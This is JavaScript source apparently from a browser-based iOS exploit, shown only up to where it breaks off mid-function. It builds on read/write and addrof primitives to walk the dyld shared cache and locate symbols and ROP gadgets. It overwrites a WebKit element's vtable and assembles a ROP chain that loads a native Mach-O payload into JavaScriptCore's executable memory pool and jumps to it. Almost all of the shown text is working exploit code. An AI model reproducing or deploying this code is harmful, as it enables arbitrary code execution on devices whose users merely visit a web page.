(function()
{
    window.fail = function fail(x)
    {
        alert('FAIL: ' + x);
        location.reload();
        throw null;
    }

    window.b2u32 = function b2u32(b)
    {
        return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
    }

    function off2addr(segs, off)
    {
        if(!(off instanceof Int64)) off = new Int64(off);
        for(var i = 0; i < segs.length; ++i)
        {
            var start = segs[i].fileoff;
            var end   = Add(start, segs[i].size);
            if
            (
                (start.hi() < off.hi() || (start.hi() == off.hi() && start.lo() <= off.lo())) &&
                (end.hi() > off.hi() || (end.hi() == off.hi() && end.lo() > off.lo()))
            )
            {
                return Add(segs[i].addr, Sub(off, start));
            }
        }
        return new Int64("0x4141414141414141");
    }

    function fsyms(mem, base, segs, want, syms)
    {
        want = Array.from(want); // copy
        if(syms === undefined)
        {
            syms = {};
        }

        var stab = null;
        var ncmds = mem.u32(Add(base, 0x10));
        for(var i = 0, off = 0x20; i < ncmds; ++i)
        {
            var cmd = mem.u32(Add(base, off));
            if(cmd == 0x2) // LC_SYMTAB
            {
                var b = mem.read(Add(base, off + 0x8), 0x10);
                stab =
                {
                    symoff:  b2u32(b.slice(0x0, 0x4)),
                    nsyms:   b2u32(b.slice(0x4, 0x8)),
                    stroff:  b2u32(b.slice(0x8, 0xc)),
                    strsize: b2u32(b.slice(0xc, 0x10)),
                };
                break;
            }
            off += mem.u32(Add(base, off + 0x4));
        }
        if(stab == null)
        {
            fail("stab");
        }
        var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
        var fn = function(i)
        {
            return mem.read(Add(tmp.base, tmp.off + i), 1)[0];
        };
        for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
        {
            tmp.off = mem.u32(off2addr(segs, stab.symoff + i * 0x10));
            for(var j = 0; j < want.length; ++j)
            {
                var s = want[j];
                if((strcmp(fn, s)))
                {
                    syms[s] = mem.readInt64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
                    want.splice(j, 1);
                    break;
                }
            }
        }
        return syms;
    }

    function strcmp(b, str)
    {
        var fn = typeof b == "function" ? b : function(i) { return b[i]; };
        for(var i = 0; i < str.length; ++i)
        {
            if(fn(i) != str.charCodeAt(i))
            {
                return false;
            }
        }
        return fn(str.length) == 0;
    }

    function _u32(i)
    {
        return b2u32(this.read(i, 4));
    }

    function _read(i, l)
    {
        if (i instanceof Int64) i = i.lo();
        if (l instanceof Int64) l = l.lo();
        if (i + l > this.length)
        {
            fail(`OOB read: ${i} -> ${i + l}, size: ${l}`);
        }
        return this.slice(i, i + l);
    }

    function _readInt64(addr)
    {
        return new Int64(this.read(addr, 8));
    }

    function _writeInt64(i, val)
    {
        if (i instanceof Int64) i = i.lo();
        this.set(val.bytes(), i);
    }

    window.spyware = function(stage1, memory, binary)
    {
        //print(`binary length: ${hexit(binary.length)}`)

        //alert('spyware')
        var wrapper = document.createElement("div")
        var wrapper_addr = stage1.addrof(wrapper)

        var el_addr = memory.readInt64(wrapper_addr + 0x18)
        var vtab = memory.readInt64(el_addr)

        memory.u32 = _u32;

        // regloader:
        // 0x180ee6048      e00317aa       mov x0, x23
        // 0x180ee604c      e10316aa       mov x1, x22
        // 0x180ee6050      e20318aa       mov x2, x24
        // 0x180ee6054      e30319aa       mov x3, x25
        // 0x180ee6058      e4031aaa       mov x4, x26
        // 0x180ee605c      e5031baa       mov x5, x27
        // 0x180ee6060      80033fd6       blr x28

        // dispatch:
        // 0x180d62e48      a0023fd6       blr x21
        // 0x180d62e4c      fd7b43a9       ldp x29, x30, [sp, 0x30]
        // 0x180d62e50      f44f42a9       ldp x20, x19, [sp, 0x20]
        // 0x180d62e54      f65741a9       ldp x22, x21, [sp, 0x10]
        // 0x180d62e58      ff030191       add sp, sp, 0x40
        // 0x180d62e5c      c0035fd6       ret

        // alt dispatch:
        // 0x1811a37f0      a0023fd6       blr x21
        // 0x1811a37f4      bf8300d1       sub sp, x29, 0x20
        // 0x1811a37f8      fd7b42a9       ldp x29, x30, [sp, 0x20]
        // 0x1811a37fc      f44f41a9       ldp x20, x19, [sp, 0x10]
        // 0x1811a3800      f657c3a8       ldp x22, x21, [sp], 0x30
        // 0x1811a3804      c0035fd6       ret

        // stackloader:
        // 0x18098e2a8      fd7b46a9       ldp x29, x30, [sp, 0x60]
        // 0x18098e2ac      f44f45a9       ldp x20, x19, [sp, 0x50]
        // 0x18098e2b0      f65744a9       ldp x22, x21, [sp, 0x40]
        // 0x18098e2b4      f85f43a9       ldp x24, x23, [sp, 0x30]
        // 0x18098e2b8      fa6742a9       ldp x26, x25, [sp, 0x20]
        // 0x18098e2bc      fc6f41a9       ldp x28, x27, [sp, 0x10]
        // 0x18098e2c0      ffc30191       add sp, sp, 0x70
        // 0x18098e2c4      c0035fd6       ret

        // alt stackloader:
        // 0x1811b4aa4      bf4301d1       sub sp, x29, 0x50
        // 0x1811b4aa8      fd7b45a9       ldp x29, x30, [sp, 0x50]
        // 0x1811b4aac      f44f44a9       ldp x20, x19, [sp, 0x40]
        // 0x1811b4ab0      f65743a9       ldp x22, x21, [sp, 0x30]
        // 0x1811b4ab4      f85f42a9       ldp x24, x23, [sp, 0x20]
        // 0x1811b4ab8      fa6741a9       ldp x26, x25, [sp, 0x10]
        // 0x1811b4abc      fc6fc6a8       ldp x28, x27, [sp], 0x60
        // 0x1811b4ac0      c0035fd6       ret

        // __longjmp:
        // 0x180700ad4      135040a9       ldp x19, x20, [x0]
        // 0x180700ad8      155841a9       ldp x21, x22, [x0, 0x10]
        // 0x180700adc      176042a9       ldp x23, x24, [x0, 0x20]
        // 0x180700ae0      196843a9       ldp x25, x26, [x0, 0x30]
        // 0x180700ae4      1b7044a9       ldp x27, x28, [x0, 0x40]
        // 0x180700ae8      1d7845a9       ldp x29, x30, [x0, 0x50]
        // 0x180700aec      1d0846a9       ldp x29, x2, [x0, 0x60]

        var anchor = memory.readInt64(vtab);
        var hdr = Sub(anchor, anchor.lo() & 0xfff);
        var b = [];
        while(true)
        {
            if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64"))
            {
                break;
            }
            hdr = Sub(hdr, 0x1000);
        }
        var base_seg = null;
        var nsegs    = memory.u32(Add(hdr, 0x14));
        var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
        var segs     = [];
        for(var i = 0; i < nsegs; ++i)
        {
            var off = i * 0x20;
            var seg =
            {
                addr:     new Int64(segdata.slice(off +  0x0, off +  0x8)),
                size:     new Int64(segdata.slice(off +  0x8, off + 0x10)),
                fileoff:  new Int64(segdata.slice(off + 0x10, off + 0x18)),
                maxprot:  b2u32(segdata.slice(off + 0x18, off + 0x1c)),
                initprot: b2u32(segdata.slice(off + 0x1c, off + 0x20))
            };
            segs.push(seg);
            if(seg.fileoff.hi() == 0 && seg.fileoff.lo() == 0 && (seg.size.hi() != 0 || seg.size.lo() != 0))
            {
                base_seg = seg;
            }
        }
        if(base_seg == null)
        {
            fail("base_seg");
        }
        var cache_slide = Sub(hdr, base_seg.addr);
        for(var i = 0; i < segs.length; ++i)
        {
            segs[i].addr = Add(segs[i].addr, cache_slide);
        }
        var libs =
        {
            "/usr/lib/system/libsystem_platform.dylib":                             ["__longjmp", "__platform_memmove"],
            "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
            "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
            "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   [
                "__ZN3JSC32startOfFixedExecutableMemoryPoolE",
                "__ZN3JSC30endOfFixedExecutableMemoryPoolE",
            ],
        };

        var opcodes;
        var opcode_libs;

        if (/\b10_\S+ like Mac OS X/.test(navigator.userAgent)) {
            //print('found iPhone OS 10')
            opcodes = {
                // mov x0, x23; mov x1, x22; mov x2, x24; mov x3, x25; mov x4, x26; mov x5, x27; blr x28
                "regloader":   [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ],
                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
                "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
                // blr x21; sub sp, x29, 0x20; ldp x29, x30, [sp, 0x20]; ldp x20, x19, [sp, 0x10]; ldp x22, x21, [sp], 0x30; ret
                "altdispatch": [ 0xd63f02a0, 0xd10083bf, 0xa9427bfd, 0xa9414ff4, 0xa8c357f6, 0xd65f03c0 ],
                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
                "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
                // sub sp, x29, 0x50; ldp x29, x30, [sp, 0x50]; ldp x20, x19, [sp, 0x40]; ldp x22, x21, [sp, 0x30];
                // ldp x24, x23, [sp, 0x20]; ldp x26, x25, [sp, 0x10]; ldp x28, x27, [sp], 0x60; ret
                "altstackloader": [ 0xd10143bf, 0xa9457bfd, 0xa9444ff4, 0xa94357f6, 0xa9425ff8, 0xa94167fa, 0xa8c66ffc, 0xd65f03c0 ],
            };

            opcode_libs = [ "/usr/lib/libLLVM.dylib" ];
        } else {
            //print('found iPhone OS != 10')
            libs["/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"].push(
                "__ZN3JSC29jitWriteSeparateHeapsFunctionE"
            )

            opcodes = {
                // ldr x8, [sp] ; str x8, [x19] ; ldp x29, x30, [sp, #0x20] ; ldp x20, x19, [sp, #0x10] ; add sp, sp, #0x30 ; ret
                "ldrx8":       [0xf94003e8, 0xf9000268, 0xa9427bfd, 0xa9414ff4, 0x9100c3ff, 0xd65f03c0],
                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
                "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
                // mov x3, x22 ; mov x6, x27 ; mov x0, x24 ; mov x1, x19 ; mov x2, x23 ; ldr x4, [sp] ; blr x8
                "regloader":   [ 0xaa1603e3, 0xaa1b03e6, 0xaa1803e0, 0xaa1303e1, 0xaa1703e2, 0xf94003e4, 0xd63f0100 ],
                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
                "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
                // mov x4, x20 ; blr x8
                "movx4":       [ 0xaa1403e4, 0xd63f0100 ],
                // ldr x0, [x0] -- for debugging
                "ldrx0x0":     [ 0xf9400000 ],
            }
            opcode_libs = [
                "/usr/lib/PN548.dylib",     // dispatch, stackloader
                "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, movx4, stackloader
            ];
        }
        //print('lookin through cache');

        var syms = {};
        var gadgets = {};
        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
        var nimgs = memory.u32(Add(hdr, 0x1c));
        for(var i = 0; i < nimgs; ++i)
        {
            var straddr = off2addr(segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));
            var fn = function(i)
            {
                return memory.read(Add(straddr, i), 1)[0];
            };
            var base = Add(memory.readInt64(Add(imgs, i * 0x20)), cache_slide);
            if(opcode_libs.some(lib => strcmp(fn, lib)))
            {
                var ncmds = memory.u32(Add(base, 0x10));
                for(var j = 0, off = 0x20; j < ncmds; ++j)
                {
                    var cmd = memory.u32(Add(base, off));
                    if(cmd == 0x19 && strcmp(memory.read(Add(base, off + 0x8), 0x10), "__TEXT")) // LC_SEGMENT_64
                    {
                        var nsects = memory.u32(Add(base, off + 0x40));
                        for(var k = 0, o = off + 0x48; k < nsects; ++k)
                        {
                            if(strcmp(memory.read(Add(base, o), 0x10), "__text"))
                            {
                                var keys = Object.keys(opcodes).filter(k=>!gadgets.hasOwnProperty[k])
                                if (keys.length == 0) break;
                                var match = {};
                                for(var z = 0; z < keys.length; ++z)
                                {
                                    match[keys[z]] = 0;
                                }

                                var addr = Add(memory.readInt64(Add(base, o + 0x20)), cache_slide)
                                var size = memory.u32(Add(base, o + 0x28))

                                // Copy the entire __text region into a Uint32Array for faster processing.
                                // Previously you could map a Uint32Array over the data, but on i7+ devices
                                // this caused access violations.
                                // Instead we read the entire region and copy it into a Uint32Array. The
                                // memory.read primitive has a weird limitation where it's only able to read
                                // up to 4096 bytes. to get around this we'll read multiple times and combine
                                // them into one.

                                var allData = new Uint32Array(size / 4)
                                for (var r = 0; r < size; r += 4096) {
                                    // Check to ensure we don't read out of the region we want
                                    var qty = 4096
                                    if (size - r < qty) {
                                        qty = size - r
                                    }
                                    var data = memory.read(Add(addr, r), qty)

                                    // Data is an array of single bytes. This code takes four entries
                                    // and converts them into a single 32-bit integer. It then adds it
                                    // into the `allData` array at the given index
                                    for (var h = 0; h < qty; h += 4) {
                                        var fourBytes = b2u32(data.slice(h, h + 4))
                                        allData[(r + h) / 4] = fourBytes
                                    }
                                }

                                // Loop through the entire data map looking for each gadget we need
                                for (var f = 0; f < size && keys.length > 0; f++) {
                                    var op = allData[f]

                                    for (var z = 0; z < keys.length; z++) {
                                        var key = keys[z]
                                        var opcode = opcodes[key]

                                        if (op == opcode[match[key]]) {
                                            match[key]++
                                            if (match[key] == opcode.length) {
                                                gadgets[key] = Add(addr, (f - (opcode.length - 1)) * 4)
                                                keys.splice(z, 1)
                                                break
                                            }
                                        } else {
                                            match[key] = 0
                                        }
                                    }
                                }

                                break
                            }
                            o += 0x50;
                        }
                        break;
                    }
                    off += memory.u32(Add(base, off + 0x4));
                }
                continue;
            }
            var lookup = null;
            for(var k = Object.keys(libs), j = 0; j < k.length; ++j)
            {
                if(strcmp(fn, k[j]))
                {
                    lookup = libs[k[j]];
                    break;
                }
            }
            if(lookup != null)
            {
                fsyms(memory, base, segs, lookup, syms);
            }
        }
        if(!gadgets['dispatch'])
        {
            gadgets['dispatch'] = gadgets['altdispatch'];
        }
        if(!gadgets['stackloader'])
        {
            gadgets['stackloader'] = gadgets['altstackloader'];
        }
        delete opcodes['altdispatch'];
        delete opcodes['altstackloader'];
        var k = Object.values(libs).reduce(function(p,c){ c.forEach(function(e){ p.push(e) });return p; }, []);
        for(var i = 0; i < k.length; ++i)
        {
            var s = k[i];
            if(syms[s] == null)
            {
                fail(s);
            }
            syms[s] = Add(syms[s], cache_slide);
        }
        k = Object.keys(opcodes);
        for(var i = 0; i < k.length; ++i)
        {
            var s = k[i];
            if(gadgets[s] == null)
            {
                fail(s);
            }
        }

        //print('all gadgets found')
        var longjmp             = syms["__longjmp"];
        var regloader           = gadgets["regloader"];
        var dispatch            = gadgets["dispatch"];
        var stackloader         = gadgets["stackloader"];
        var ldrx8               = gadgets["ldrx8"]; // might be undefined, then superb llvm gadgets are assumed
        var movx4               = gadgets["movx4"]; // might be undefined, then superb llvm gadgets are assumed
        var mach_task_self_     = new Int64(memory.readInt64(syms["_mach_task_self_"]).lo());
        var mach_vm_protect     = syms["__kernelrpc_mach_vm_protect_trap"];
        var memmove             = syms["__platform_memmove"];
        var usleep              = syms["_usleep"];
        var memPoolStart        = memory.readInt64(syms["__ZN3JSC32startOfFixedExecutableMemoryPoolE"]);
        var memPoolEnd          = memory.readInt64(syms["__ZN3JSC30endOfFixedExecutableMemoryPoolE"]);

        var jitWriteSeparateHeaps;
        if (syms["__ZN3JSC29jitWriteSeparateHeapsFunctionE"]) {
            jitWriteSeparateHeaps = memory.readInt64(syms["__ZN3JSC29jitWriteSeparateHeapsFunctionE"]);
        } else {
            jitWriteSeparateHeaps = Int64.Zero;
        }

        // This is easier than Uint32Array and dividing offset all the time
        binary.u32 = _u32;
        binary.read = _read;
        binary.readInt64 = _readInt64;
        binary.writeInt64 = _writeInt64;
        var pstart = new Int64("0xffffffffffffffff");
        var pend   = new Int64(0);
        var ncmds  = binary.u32(0x10);
        for(var i = 0, off = 0x20; i < ncmds; ++i)
        {
            var cmd = binary.u32(off);
            if(cmd == 0x19) // LC_SEGMENT_64
            {
                var filesize = binary.readInt64(off + 0x30);
                if(!(filesize.hi() == 0 && filesize.lo() == 0))
                {
                    var vmstart = binary.readInt64(off + 0x18);
                    var vmsize = binary.readInt64(off + 0x20);
                    var vmend = Add(vmstart, vmsize);

                    if(vmstart.hi() < pstart.hi() || (vmstart.hi() == pstart.hi() && vmstart.lo() <= pstart.lo()))
                    {
                        pstart = vmstart;
                    }
                    if(vmend.hi() > pend.hi() || (vmend.hi() == pend.hi() && vmend.lo() > pend.lo()))
                    {
                        pend = vmend;
                    }
                }
            }
            off += binary.u32(off + 0x4);
        }
        var shsz = Sub(pend, pstart);
        if(shsz.hi() != 0)
        {
            fail("shsz");
        }
        var payload = new Uint8Array(shsz.lo());
        var paddr = memory.readInt64(Add(stage1.addrof(payload), 0x10));
        var codeAddr = Sub(memPoolEnd, shsz);
        codeAddr = Sub(codeAddr, codeAddr.lo() & 0x3fff);
        var shslide = Sub(codeAddr, pstart);
        segs = [];
        var off = 0x20;
        for(var i = 0; i < ncmds; ++i)
        {
            var cmd = binary.u32(off);
            if(cmd == 0x19) // LC_SEGMENT_64
            {
                var filesize = binary.readInt64(off + 0x30);
                if(!(filesize.hi() == 0 && filesize.lo() == 0))
                {
                    var vmaddr   = binary.readInt64(off + 0x18);
                    var vmsize   = binary.readInt64(off + 0x20);
                    var fileoff  = binary.readInt64(off + 0x28);
                    var prots    = binary.readInt64(off + 0x38); // lo=init_prot, hi=max_prot

                    if(vmsize.hi() < filesize.hi() || (vmsize.hi() == filesize.hi() && vmsize.lo() <= filesize.lo()))
                    {
                        filesize = vmsize;
                    }
                    segs.push({
                        addr:    Sub(vmaddr, pstart),
                        size:    filesize,
                        fileoff: fileoff,
                        prots:   prots,
                    });

                    if(fileoff.hi() != 0)
                    {
                        fail("fileoff");
                    }
                    if(filesize.hi() != 0)
                    {
                        fail("filesize");
                    }

                    fileoff = fileoff.lo();
                    filesize = filesize.lo();
                    payload.set(binary.slice(fileoff, fileoff + filesize), Sub(vmaddr, pstart).lo());
                }
            }
            off += binary.u32(off + 0x4);
        }

        payload.u32 = _u32;
        payload.read = _read;
        payload.readInt64 = _readInt64;
        var psyms = fsyms(payload, 0, segs, ["genesis"]);
        if(psyms["genesis"] == null)
        {
            fail("genesis");
        }
        var jmpAddr = Add(psyms["genesis"], shslide);
        //print(`finna jmp ${jmpAddr}`)
		
		// hopefully we get better crash logs for the i7+ bug with this
		// gets the GET parameter debug_with_vtab_smash
		var params = location.search.substr(1).split("&");
		for (var index = 0; index < params.length; index++) {
			    param = params[index].split("=");
				if (param[0] == "debug_with_vtab_smash") {
					if (!confirm("You are running a debug feature, which will cause instability, if you weren't instructed to do so, please stop using it!")) {
						alert("Ok pls remove the arg and reload the site");
						throw "stop yo";
					}
					var max_smash = parseInt(decodeURIComponent(param[1]));
					if (isNaN(max_smash)) {
						throw "w00t I said ints...";
					}
					smash_int = new Int64("0x4241414141414141");
					for (let i = 0; i < max_smash;i += 8) {
						memory.writeInt64(Add(vtab,i), Add(smash_int,i));
					}
					alert("Smashed vtab! Pls get the newest crash log and show it to us");
				}
				if (param[0] == "dump_el_obj") {
					if (!confirm("You are running a debug feature, if you weren't instructed to do so, please stop using it!")) {
						alert("Ok pls remove the arg and reload the site");
						throw "stop yo";
					}
					var how_much = parseInt(decodeURIComponent(param[1]));
					if (isNaN(how_much)) {
						throw "w00t I said ints...";
					}
					how_much = how_much * 8; 
					data = "";
					for (let i = 0; i < how_much; i += 8) {
						data += hexlify(memory.readInt64(Add(wrapper_addr,i)).bytes) + "\n";
					}
					document.write(data);
					alert("Ok stoped running code now");
					throw "bye bye";
				}
		}

        memory.writeInt64(Add(vtab, 0x18), longjmp);
        memory.writeInt64(Add(el_addr, 0x58), stackloader);        // x30 (gadget)

        var arrsz = 0x100000,
            off   =   0x1000;
        var arr   = new Uint32Array(arrsz);
        var stack = memory.readInt64(Add(stage1.addrof(arr), 0x10));

        var pos = arrsz - off;


        var add_call_llvm = function(func, x0, x1, x2, x3, x4, jump_to) {
            x4 = x4 || Int64.Zero

            // in stackloader:
            arr[pos++] = 0xdead0010;                // unused
            arr[pos++] = 0xdead0011;                // unused
            arr[pos++] = 0xdead0012;                // unused
            arr[pos++] = 0xdead0013;                // unused
            arr[pos++] = dispatch.lo();             // x28 (gadget for regloader)
            arr[pos++] = dispatch.hi();             // x28 (gadget for regloader)
            arr[pos++] = 0xdead0014;                // x27 (unused)
            arr[pos++] = 0xdead0015;                // x27 (unused)
            arr[pos++] = x4.lo();                   // x26 == x4 (arg5)
            arr[pos++] = x4.hi();                   // x26 == x4 (arg5)
            arr[pos++] = x3.lo();                   // x25 == x3 (arg4)
            arr[pos++] = x3.hi();                   // x25 == x3 (arg4)
            arr[pos++] = x2.lo();                   // x24 == x2 (arg3)
            arr[pos++] = x2.hi();                   // x24 == x2 (arg3)
            arr[pos++] = x0.lo();                   // x23 == x0 (arg1)
            arr[pos++] = x0.hi();                   // x23 == x0 (arg1)
            arr[pos++] = x1.lo();                   // x22 == x1 (arg2)
            arr[pos++] = x1.hi();                   // x22 == x1 (arg2)
            arr[pos++] = func.lo();                 // x21 (func)
            arr[pos++] = func.hi();                 // x21 (func)
            arr[pos++] = 0xdead0018;                // x20 (unused)
            arr[pos++] = 0xdead0019;                // x20 (unused)
            arr[pos++] = 0xdead001a;                // x19 (unused)
            arr[pos++] = 0xdead001b;                // x19 (unused)
            var tmppos = pos;
            arr[pos++] = Add(stack, tmppos*4 + 0x40).lo(); // x29
            arr[pos++] = Add(stack, tmppos*4 + 0x40).hi(); // x29
            arr[pos++] = regloader.lo();            // x30 (first gadget)
            arr[pos++] = regloader.hi();            // x30 (first gadget)

            // after dispatch:
            arr[pos++] = 0xdead0020;                // unused
            arr[pos++] = 0xdead0021;                // unused
            arr[pos++] = 0xdead0022;                // unused
            arr[pos++] = 0xdead0023;                // unused
            arr[pos++] = 0xdead0024;                // x22 (unused)
            arr[pos++] = 0xdead0025;                // x22 (unused)
            arr[pos++] = 0xdead0026;                // x21 (unused)
            arr[pos++] = 0xdead0027;                // x21 (unused)
            arr[pos++] = 0xdead0028;                // x20 (unused)
            arr[pos++] = 0xdead0029;                // x20 (unused)
            arr[pos++] = 0xdead002a;                // x19 (unused)
            arr[pos++] = 0xdead002b;                // x19 (unused)
            tmppos = pos;
            arr[pos++] = Add(stack, tmppos*4 + 0x70).lo(); // x29
            arr[pos++] = Add(stack, tmppos*4 + 0x70).hi(); // x29
            arr[pos++] = jump_to.lo();              // x30 (gadget)
            arr[pos++] = jump_to.hi();              // x30 (gadget)
        }

        var add_call_via_x8 = function(func, x0, x1, x2, x3, x4, jump_to) {
            //alert(`add_call_via_x8: ${func}(${x0}, ${x1}, ${x2}, ${x3}, ${x4}, ${jump_to})`);
            //x4 = x4 || Int64.One
            // in stackloader:
            arr[pos++] = 0xdead0010;                // unused
            arr[pos++] = 0xdead0011;                // unused
            arr[pos++] = 0xdead0012;                // unused
            arr[pos++] = 0xdead0013;                // unused
            arr[pos++] = 0xdead1101;                // x28 (unused)
            arr[pos++] = 0xdead1102;                // x28 (unused)
            arr[pos++] = 0xdead0014;                // x27 == x6 (unused)
            arr[pos++] = 0xdead0015;                // x27 == x6 (unused)
            arr[pos++] = 0xdead0016;                // x26 (unused)
            arr[pos++] = 0xdead0017;                // x26 (unused)
            arr[pos++] = x3.lo();                   // x25 == x3 (arg4)
            arr[pos++] = x3.hi();                   // x25 == x3 (arg4)
            arr[pos++] = x0.lo();                   // x24 == x0 (arg1)
            arr[pos++] = x0.hi();                   // x24 == x0 (arg1)
            arr[pos++] = x2.lo();                   // x23 == x2 (arg3)
            arr[pos++] = x2.hi();                   // x23 == x2 (arg3)
            arr[pos++] = x3.lo();                   // x22 == x3 (arg4)
            arr[pos++] = x3.hi();                   // x22 == x3 (arg4)
            arr[pos++] = func.lo();                 // x21 (target for dispatch)
            arr[pos++] = func.hi();                 // x21 (target for dispatch)
            arr[pos++] = 0xdead0018;                // x20 (unused)
            arr[pos++] = 0xdead0019;                // x20 (unused)
            var tmppos = pos;
            arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])
            arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])
            arr[pos++] = 0xdead001c;                // x29 (unused)
            arr[pos++] = 0xdead001d;                // x29 (unused)
            arr[pos++] = ldrx8.lo();                // x30 (next gadget)
            arr[pos++] = ldrx8.hi();                // x30 (next gadget)

            // in ldrx8
            if (x4) {
                arr[pos++] = stackloader.lo();
                arr[pos++] = stackloader.hi();
            } else {
                arr[pos++] = dispatch.lo();             // x8 (target for regloader)
                arr[pos++] = dispatch.hi();             // x8 (target for regloader)
            }
            arr[pos++] = 0xdead1401;                // (unused)
            arr[pos++] = 0xdead1402;                // (unused)
            arr[pos++] = 0xdead1301;                // x20 (unused)
            arr[pos++] = 0xdead1302;                // x20 (unused)
            arr[pos++] = x1.lo();                   // x19 == x1 (arg2)
            arr[pos++] = x1.hi();                   // x19 == x1 (arg2)
            arr[pos++] = 0xdead1201;                // x29 (unused)
            arr[pos++] = 0xdead1202;                // x29 (unused)
            arr[pos++] = regloader.lo();            // x30 (next gadget)
            arr[pos++] = regloader.hi();            // x30 (next gadget)

            // in regloader
            // NOTE: REGLOADER DOES NOT ADJUST SP!
            // sometimes i didn't get expected value in x4
            // and i have no fucking idea why
            // usleep likely did the trick, but I would still keep the code
            // with movx4
            //arr[pos++] = x4.lo()                    // x4 (should be -- but see lines above)
            //arr[pos++] = x4.hi()                    // x4 (should be -- but see lines above)

            if (x4) {
                // in stackloader:
                arr[pos++] = 0xdaad0010;                // unused
                arr[pos++] = 0xdaad0011;                // unused
                arr[pos++] = 0xdaad0012;                // unused
                arr[pos++] = 0xdaad0013;                // unused
                arr[pos++] = 0xdaad1101;                // x28 (unused)
                arr[pos++] = 0xdaad1102;                // x28 (unused)
                arr[pos++] = 0xdaad0014;                // x27 == x6 (unused)
                arr[pos++] = 0xdaad0015;                // x27 == x6 (unused)
                arr[pos++] = 0xdaad0016;                // x26 (unused)
                arr[pos++] = 0xdaad0017;                // x26 (unused)
                arr[pos++] = 0xdaad0018;                // x25 (unused)
                arr[pos++] = 0xdaad0019;                // x25 (unused)
                arr[pos++] = 0xdaad00f0;                // x24 (unused)
                arr[pos++] = 0xdaad00f1;                // x24 (unused)
                arr[pos++] = 0xdaad00f2;                // x23 (unused)
                arr[pos++] = 0xdaad00f3;                // x23 (unused)
                arr[pos++] = 0xdaad00f4;                // x22 (unused)
                arr[pos++] = 0xdaad00f5;                // x22 (unused)
                arr[pos++] = func.lo();                 // x21 (target for dispatch)
                arr[pos++] = func.hi();                 // x21 (target for dispatch)
                arr[pos++] = 0xdaad0018;                // x20 (unused)
                arr[pos++] = 0xdaad0019;                // x20 (unused)
                tmppos = pos;
                arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])
                arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])
                arr[pos++] = 0xdaad001c;                // x29 (unused)
                arr[pos++] = 0xdaad001d;                // x29 (unused)
                arr[pos++] = ldrx8.lo();                // x30 (next gadget)
                arr[pos++] = ldrx8.hi();                // x30 (next gadget)

                // in ldrx8
                arr[pos++] = dispatch.lo();             // x8 (target for movx4)
                arr[pos++] = dispatch.hi();             // x8 (target for movx4)
                arr[pos++] = 0xdaad1401;                // (unused)
                arr[pos++] = 0xdaad1402;                // (unused)
                arr[pos++] = x4.lo();                   // x20 == x4 (arg5)
                arr[pos++] = x4.hi();                   // x20 == x4 (arg5)
                arr[pos++] = 0xdaad1301;                // x19 (unused)
                arr[pos++] = 0xdaad1302;                // x19 (unused)
                arr[pos++] = 0xdaad1201;                // x29 (unused)
                arr[pos++] = 0xdaad1202;                // x29 (unused)
                arr[pos++] = movx4.lo();                // x30 (next gadget)
                arr[pos++] = movx4.hi();                // x30 (next gadget)
            }

            // after dispatch:

            // keep only one: these or 0xdeaded01
            arr[pos++] = 0xdead0022;                // unused
            arr[pos++] = 0xdead0023;                // unused

            arr[pos++] = 0xdead0022;                // unused
            arr[pos++] = 0xdead0023;                // unused
            arr[pos++] = 0xdead0024;                // x22 (unused)
            arr[pos++] = 0xdead0025;                // x22 (unused)
            arr[pos++] = 0xdead0026;                // x21 (unused)
            arr[pos++] = 0xdead0027;                // x21 (unused)
            arr[pos++] = 0xdead0028;                // x20 (unused)
            arr[pos++] = 0xdead0029;                // x20 (unused)
            arr[pos++] = 0xdead002a;                // x19 (unused)
            arr[pos++] = 0xdead002b;                // x19 (unused)
            arr[pos++] = 0xdead002c;                // x29 (unused)
            arr[pos++] = 0xdead002d;                // x29 (unused)
            arr[pos++] = jump_to.lo();              // x30 (gadget)
            arr[pos++] = jump_to.hi();              // x30 (gadget)
        }

        var add_call = function(func, x0, x1, x2, x3, x4, jump_to) {
            x0 = x0 || Int64.Zero
            x1 = x1 || Int64.Zero
            x2 = x2 || Int64.Zero
